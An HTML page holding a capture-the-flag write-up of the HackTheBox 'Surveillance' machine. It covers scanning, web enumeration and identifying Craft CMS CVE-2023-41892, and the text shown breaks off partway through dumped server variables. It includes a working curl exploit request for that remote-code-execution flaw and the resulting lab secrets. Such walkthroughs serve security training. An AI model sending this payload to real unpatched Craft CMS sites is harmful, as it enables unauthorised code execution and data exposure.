@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox Surveillance - bchoy.me</title><meta name="Description" content="bchoy.me"><meta property="og:title" content="HackTheBox Surveillance" />
+<meta property="og:description" content="Initial Enumeration Port Scan ❯ rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.245 -- -sV -sC -oA ./{{ip}}.initial Port Protocol State Service Reason Product Version Extra Info 22 tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 Ubuntu Linux; protocol 2.0 80 tcp open http syn-ack nginx 1.18.0 Ubuntu The initial network scan reveals two ports.
+❯ curl -L http://10.10.11.245 curl: (6) Could not resolve host: surveillance.htb To resolve this site, 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchoy.me/posts/2023-12-13-hackthebox-surveillance/" /><meta property="og:image" content="https://bchoy.me/posts/2023-12-13-hackthebox-surveillance/featured-image.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-13T13:45:14+00:00" />
+<meta property="article:modified_time" content="2023-12-13T13:45:14+00:00" /><meta property="og:site_name" content="bchoy.me" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://bchoy.me/posts/2023-12-13-hackthebox-surveillance/featured-image.png"/>
+<meta name="twitter:title" content="HackTheBox Surveillance"/>
+<meta name="twitter:description" content="Initial Enumeration Port Scan ❯ rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.10.11.245 -- -sV -sC -oA ./{{ip}}.initial Port Protocol State Service Reason Product Version Extra Info 22 tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 Ubuntu Linux; protocol 2.0 80 tcp open http syn-ack nginx 1.18.0 Ubuntu The initial network scan reveals two ports.
+❯ curl -L http://10.10.11.245 curl: (6) Could not resolve host: surveillance.htb To resolve this site, 10."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bchoy.me/posts/2023-12-13-hackthebox-surveillance/" /><link rel="prev" href="https://bchoy.me/posts/2023-12-11-hackthebox-devvortex/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox Surveillance",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/bchoy.me\/posts\/2023-12-13-hackthebox-surveillance\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/bchoy.me\/posts\/2023-12-13-hackthebox-surveillance\/featured-image.png",
+                            "width":  1400 ,
+                            "height":  1166 
+                        }],"genre": "posts","wordcount":  3306 ,
+        "url": "https:\/\/bchoy.me\/posts\/2023-12-13-hackthebox-surveillance\/","datePublished": "2023-12-13T13:45:14+00:00","dateModified": "2023-12-13T13:45:14+00:00","license": "bchoy.me","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Brian Choy"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="bchoy.me">bchoy.me</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Blog </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/resume"> Resume </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="bchoy.me">bchoy.me</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Blog</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/resume" title="">Resume</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox Surveillance</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://bchoy.me" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Brian Choy</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="12-13-2023">12-13-2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3306 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;16 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/featured-image.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/featured-image.png, /posts/2023-12-13-hackthebox-surveillance/featured-image.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/featured-image.png"
+        title="/posts/2023-12-13-hackthebox-surveillance/featured-image.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-enumeration">Initial Enumeration</a>
+      <ul>
+        <li><a href="#port-scan">Port Scan</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#linux-enumeration">Linux Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux-privilege-escalation">Linux Privilege Escalation</a>
+      <ul>
+        <li><a href="#exploiting-zoneminder">Exploiting ZoneMinder</a></li>
+        <li><a href="#gaining-root">Gaining Root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ rustscan -t <span class="m">1500</span> -b <span class="m">1500</span> --ulimit <span class="m">65000</span> -a 10.10.11.245 -- -sV -sC -oA ./<span class="o">{{</span>ip<span class="o">}}</span>.initial
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocol</th>
+<th>State</th>
+<th>Service</th>
+<th>Reason</th>
+<th>Product</th>
+<th>Version</th>
+<th>Extra Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>syn-ack</td>
+<td>OpenSSH</td>
+<td>8.9p1 Ubuntu 3ubuntu0.4</td>
+<td>Ubuntu Linux; protocol 2.0</td>
+</tr>
+<tr>
+<td>80</td>
+<td>tcp</td>
+<td>open</td>
+<td>http</td>
+<td>syn-ack</td>
+<td>nginx</td>
+<td>1.18.0</td>
+<td>Ubuntu</td>
+</tr>
+</tbody>
+</table>
+<p>The initial network scan reveals two ports.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ curl -L http://10.10.11.245
+</span></span><span class="line"><span class="cl">curl: <span class="o">(</span>6<span class="o">)</span> Could not resolve host: surveillance.htb
+</span></span></code></pre></div><p>To resolve this site, <code>10.10.11.245 surveillance.htb</code> needs to be added to the <code>/etc/hosts</code> file.</p>
+<p>Now the page is viewable.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image.png, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image.png"
+        title="Home Page" width="1791" height="1164" /></p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Check to see what technologies the site was built with.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ whatweb -a3 -v surveillance.htb
+</span></span><span class="line"><span class="cl">WhatWeb report <span class="k">for</span> http://surveillance.htb
+</span></span><span class="line"><span class="cl">Status    : <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Title     : Surveillance
+</span></span><span class="line"><span class="cl">IP        : 10.10.11.245
+</span></span><span class="line"><span class="cl">Country   : RESERVED, ZZ
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Summary   : Bootstrap<span class="o">[</span>4.3.1<span class="o">]</span>, Email<span class="o">[</span>demo@surveillance.htb<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, JQuery<span class="o">[</span>3.4.1<span class="o">]</span>, nginx<span class="o">[</span>1.18.0<span class="o">]</span>, Script<span class="o">[</span>text/javascript<span class="o">]</span>, X-Powered-By<span class="o">[</span>Craft CMS<span class="o">]</span>, X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Detected Plugins:
+</span></span><span class="line"><span class="cl"><span class="o">[</span> Bootstrap <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        Bootstrap is an open <span class="nb">source</span> toolkit <span class="k">for</span> developing with
+</span></span><span class="line"><span class="cl">        HTML, CSS, and JS.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Version      : 4.3.1
+</span></span><span class="line"><span class="cl">        Version      : 4.3.1
+</span></span><span class="line"><span class="cl">        Website     : https://getbootstrap.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> Email <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        Extract email addresses. Find valid email address and
+</span></span><span class="line"><span class="cl">        syntactically invalid email addresses from mailto: link
+</span></span><span class="line"><span class="cl">        tags. We match syntactically invalid links containing
+</span></span><span class="line"><span class="cl">        mailto: to catch anti-spam email addresses, eg. bob at
+</span></span><span class="line"><span class="cl">        gmail.com. This uses the simplified email regular
+</span></span><span class="line"><span class="cl">        expression from
+</span></span><span class="line"><span class="cl">        http://www.regular-expressions.info/email.html <span class="k">for</span> valid
+</span></span><span class="line"><span class="cl">        email address matching.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        String       : demo@surveillance.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> HTML5 <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        HTML version 5, detected by the doctype declaration
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> HTTPServer <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        HTTP server header string. This plugin also attempts to
+</span></span><span class="line"><span class="cl">        identify the operating system from the server header.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        OS           : Ubuntu Linux
+</span></span><span class="line"><span class="cl">        String       : nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span> <span class="o">(</span>from server string<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> JQuery <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        A fast, concise, JavaScript that simplifies how to traverse
+</span></span><span class="line"><span class="cl">        HTML documents, handle events, perform animations, and add
+</span></span><span class="line"><span class="cl">        AJAX.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Version      : 3.4.1
+</span></span><span class="line"><span class="cl">        Website     : http://jquery.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> Script <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        This plugin detects instances of script HTML elements and
+</span></span><span class="line"><span class="cl">        returns the script language/type.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        String       : text/javascript
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> X-Powered-By <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        X-Powered-By HTTP header
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        String       : Craft CMS <span class="o">(</span>from x-powered-by string<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> X-UA-Compatible <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        This plugin retrieves the X-UA-Compatible value from the
+</span></span><span class="line"><span class="cl">        HTTP header and meta http-equiv tag. - More Info:
+</span></span><span class="line"><span class="cl">        http://msdn.microsoft.com/en-us/library/cc817574.aspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        String       : <span class="nv">IE</span><span class="o">=</span>edge
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span> nginx <span class="o">]</span>
+</span></span><span class="line"><span class="cl">        Nginx <span class="o">(</span>Engine-X<span class="o">)</span> is a free, open-source, high-performance
+</span></span><span class="line"><span class="cl">        HTTP server and reverse proxy, as well as an IMAP/POP3
+</span></span><span class="line"><span class="cl">        proxy server.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Version      : 1.18.0
+</span></span><span class="line"><span class="cl">        Website     : http://nginx.net/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">HTTP Headers:
+</span></span><span class="line"><span class="cl">        HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">        Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        Date: Tue, <span class="m">12</span> Dec <span class="m">2023</span> 04:33:18 GMT
+</span></span><span class="line"><span class="cl">        Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">        Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">        Connection: close
+</span></span><span class="line"><span class="cl">        X-Powered-By: Craft CMS
+</span></span><span class="line"><span class="cl">        Content-Encoding: gzip
+</span></span></code></pre></div><p><code>whatweb</code> reveals that the site is running <code>Craft CMS</code>. Let&rsquo;s enumerate over the
+directories now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ feroxbuster -u <span class="s2">&#34;http://surveillance.htb&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --silent --filter-status <span class="m">503</span> --dont-scan img,js,images,css
+</span></span><span class="line"><span class="cl">http://surveillance.htb/admin <span class="o">=</span>&gt; http://surveillance.htb/admin/login                        http://surveillance.htb/logout <span class="o">=</span>&gt; http://surveillance.htb/                                  http://surveillance.htb/                                                                    http://surveillance.htb/fonts <span class="o">=</span>&gt; http://surveillance.htb/fonts/                             http://surveillance.htb/index
+</span></span></code></pre></div><p>Enumerating files.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ feroxbuster -u <span class="s2">&#34;http://surveillance.htb&#34;</span> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --dont-scan img,js,images,css
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl"><span class="p">|</span>__  <span class="p">|</span>__  <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ <span class="p">|</span> <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>__
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    <span class="p">|</span>___ <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>  <span class="se">\ </span><span class="p">|</span> <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>__/ <span class="p">|</span>___
+</span></span><span class="line"><span class="cl">by Ben <span class="s2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.1
+</span></span><span class="line"><span class="cl">───────────────────────────┬──────────────────────
+</span></span><span class="line"><span class="cl"> 🎯  Target Url            │ http://surveillance.htb
+</span></span><span class="line"><span class="cl"> 🚫  Don<span class="s1">&#39;t Scan Regex      │ img
+</span></span></span><span class="line"><span class="cl"><span class="s1"> 🚫  Don&#39;</span>t Scan Regex      │ js
+</span></span><span class="line"><span class="cl"> 🚫  Don<span class="s1">&#39;t Scan Regex      │ images
+</span></span></span><span class="line"><span class="cl"><span class="s1"> 🚫  Don&#39;</span>t Scan Regex      │ css
+</span></span><span class="line"><span class="cl"> 🚀  Threads               │ <span class="m">50</span>
+</span></span><span class="line"><span class="cl"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+</span></span><span class="line"><span class="cl"> 👌  Status Codes          │ All Status Codes!
+</span></span><span class="line"><span class="cl"> 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ <span class="m">7</span>
+</span></span><span class="line"><span class="cl"> 🦡  User-Agent            │ feroxbuster/2.10.1
+</span></span><span class="line"><span class="cl"> 🔎  Extract Links         │ <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"> 🏁  HTTP methods          │ <span class="o">[</span>GET<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 🔃  Recursion Depth       │ <span class="m">4</span>
+</span></span><span class="line"><span class="cl">───────────────────────────┴──────────────────────
+</span></span><span class="line"><span class="cl"> 🏁  Press <span class="o">[</span>ENTER<span class="o">]</span> to use the Scan Management Menu™
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl"><span class="m">404</span>      GET       63l      222w        -c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with --dont-filter
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      475l     1185w    16230c http://surveillance.htb/index.php
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      475l     1185w    16230c http://surveillance.htb/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        9l       26w      304c http://surveillance.htb/.htaccess
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET       27l       63w     1202c http://surveillance.htb/web.config
+</span></span></code></pre></div><p>The scans reveal a login page.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-1.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-1.png"
+        title="Craft CMS Login" width="1791" height="1163" /></p>
+<p>It says right there again, &ldquo;craft cms&rdquo;. To look for potential vulnerabilities I
+check if there are any available using <code>searchsploit</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ searchsploit craft cms
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                            <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Craft CMS 2.6 - Cross-Site Scripting                      <span class="p">|</span> php/webapps/42143.txt
+</span></span><span class="line"><span class="cl">Craft CMS 2.7.9/3.2.5 - Information Disclosure            <span class="p">|</span> php/webapps/47343.txt
+</span></span><span class="line"><span class="cl">Craft CMS 3.0.25 - Cross-Site Scripting                   <span class="p">|</span> php/webapps/46054.txt
+</span></span><span class="line"><span class="cl">Craft CMS 3.1.12 Pro - Cross-Site Scripting               <span class="p">|</span> php/webapps/46496.txt
+</span></span><span class="line"><span class="cl">Craft CMS SEOmatic plugin 3.1.4 - Server-Side Template In <span class="p">|</span> linux/webapps/45108.txt
+</span></span><span class="line"><span class="cl">CraftCMS <span class="m">3</span> vCard Plugin 1.0.0 - Remote Code Execution     <span class="p">|</span> php/webapps/48492.py
+</span></span><span class="line"><span class="cl">craftercms 4.x.x - CORS                                   <span class="p">|</span> multiple/webapps/51313.txt
+</span></span><span class="line"><span class="cl">---------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">Papers: No Results
+</span></span></code></pre></div><p>My initial enumeration didn&rsquo;t yield any results for the Craft CMS version number
+and nothing in <code>searchsploit</code> looks particularly promising. After some Googling,
+I found a recent vulnerability for Craft CMS
+<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892" target="_blank" rel="noopener noreffer ">CVE-2023-41892</a>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-17.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-17.png"
+        title="CVE-2023-41892" width="1546" height="916" /></p>
+<p>It is a critical vulnerability rated 9.8 and 10, affecting versions before
+4.4.15. The <a href="https://github.com/craftcms/cms/blob/develop/CHANGELOG.md#4415---2023-07-03-critical" target="_blank" rel="noopener noreffer ">Craft CMS GitHub repo&rsquo;s changelog</a>
+shows this vulnerability was patched 2023-07-03. There&rsquo;s a chance this site is
+vulnerable.</p>
+<h2 id="initial-foothold">Initial Foothold</h2>
+<p>I also found some resources explaining how this exploit works:</p>
+<ul>
+<li><a href="https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/" target="_blank" rel="noopener noreffer ">https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/</a></li>
+<li><a href="https://blog.calif.io/p/craftcms-rce" target="_blank" rel="noopener noreffer ">https://blog.calif.io/p/craftcms-rce</a></li>
+</ul>
+<p>Test to see if the site is vulnerable to the exploit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ curl -k <span class="s2">&#34;http://surveillance.htb/index.php&#34;</span> -X POST -d <span class="s1">&#39;action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config={&#34;name&#34;:&#34;test[userCondition]&#34;,&#34;as xyz&#34;:{&#34;class&#34;:&#34;\\GuzzleHttp\\Psr7\\FnStream&#34;,&#34;__construct()&#34;:[{&#34;close&#34;:null}],&#34;_fn_close&#34;:&#34;phpinfo&#34;}}&#39;</span> &gt; output.html
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-2.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-2.png"
+        title="phpinfo" width="1790" height="1165" /></p>
+<p>This looks very promising. We also gain some valuable information by going
+through the output such as:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-3.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-3.png"
+        title="Alt text" width="1792" height="1160" /></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_APP_ID&#39;</span><span class="o">]</span> CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_ENVIRONMENT&#39;</span><span class="o">]</span> production
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_SECURITY_KEY&#39;</span><span class="o">]</span> 2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_DRIVER&#39;</span><span class="o">]</span> mysql
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_SERVER&#39;</span><span class="o">]</span> 127.0.0.1
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_PORT&#39;</span><span class="o">]</span> <span class="m">3306</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_DATABASE&#39;</span><span class="o">]</span> craftdb
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;CRAFT_DB_USER&#39;</span><span class="o">]</span> craftuser
